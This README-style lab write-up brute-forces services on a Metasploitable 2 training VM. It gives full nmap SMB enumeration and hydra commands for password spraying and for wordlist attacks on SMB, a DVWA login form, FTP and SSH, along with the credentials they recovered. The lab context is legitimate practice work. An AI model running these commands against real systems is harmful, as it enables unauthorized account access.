# metasploitable2-brute-forces

brute forcing a few of the metasploitable 2 services using `hydra` and `nmap`

# nmap scan

first we scan the server ip to see wich services are listening, you can see the log in `nmap_scan.txt`. <br>
here are the services we want to brute force:

```
PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          vsftpd 2.3.4
22/tcp   open  ssh          OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp   open  http         Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp  open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

# nmap smb enumeration

Here we use a combination of all `smb-enum*` NSE scripts to enumerate all the information we can about the smb service

```
nmap -v -p 139,445 --script smb-enum* -oN Desktop/nmap_smb_enum.txt 192.168.100.10
```

Doing that we get a list of smb users:

```
Host script results:
| smb-enum-users:
|   METASPLOITABLE\backup (RID: 1068)
|     Full name:   backup
|     Flags:       Account disabled, Normal user account
|   METASPLOITABLE\bin (RID: 1004)
|     Full name:   bin
|     Flags:       Account disabled, Normal user account
...
```

We use cat, grep, awk and cut to format the scan into a login wordlist

```
cat nmap_smb_enum.txt | grep 'RID' | awk -F' ' '{print $2}' | cut -d'\' -f2 > smb_users.txt
```

Getting the following wordlist:

```
backup
bin
bind
daemon
dhcp
distccd
ftp
games
gnats
irc
...
```

# smb password spraying

Using the `smb_user.txt` wordlist we spray for the passwords `admin` and `password`

```
hydra -v -e sr -I -s 139,445 -L Desktop/smb_users.txt -p admin -o Desktop/hydra_smb_brute.txt 192.168.100.10 smb
hydra -v -e sr -I -s 139,445 -L Desktop/smb_users.txt -p password -o Desktop/hydra_smb_brute.txt 192.168.100.10 smb
```

But ultimately getting the login credentials from the repeated login and password flag `-e sr`

```
[139][smb] host: 192.168.100.10   login: msfadmin   password: msfadmin
[139][smb] host: 192.168.100.10   login: user   password: user
```

# dvwa http brute force

here we use hydra's `http-post-form` module to get the `admin` user credentials

```
hydra -V -o Desktop/hydra_log.txt -l admin -P /usr/share/wordlists/rockyou.txt -u -e sr -s 80 -m /dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed -I 192.168.100.10 http-post-form
```

we use the `-m` module arguments to pass the request directory, format and fail response
`"<dir>:<request>:<fail>"`

```
"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

the password is found in the wordlist:

```
[80][http-post-form] host: 192.168.100.10   login: admin   password: password
```

# ftp brute force

for the ftp service we try the `rockyou.txt` wordlist

```
hydra -l msfadmin -p /usr/share/wordlists/rockyou.txt -e sr -o Desktop/hydra_ftp_log.txt -I ftp://192.168.100.10
```

but again get the credentials from the repeated password flag

```
[21][ftp] host: 192.168.100.10   login: msfadmin   password: msfadmin
```

# ssh brute force

for the ssh we try the already known user `msfadmin` with the `rockyou.txt` wordlist

```
hydra -V -o Desktop/hydra_ssh.txt -e sr -l msfadmin -P /usr/share/wordlists/rockyou.txt 192.168.100.10 ssh
```

and end up getting the credentials with the repeated password flag

```
[22][ssh] host: 192.168.100.10   login: msfadmin   password: msfadmin
```

# some hydra flags used

-   `-v` -> verbose flag
-   `-e sr` -> test for equal login and password and reversed password
-   `-s` -> selecting ports
-   `-L` -> selecting user list
-   `-l` -> selecting user
-   `-P` -> selecting password list
-   `-p` -> selecting password
-   `192.168.100.10 <module>` -> selecting target and module
-   `-I` -> do not restore hydra session
-   `-o` -> output log file
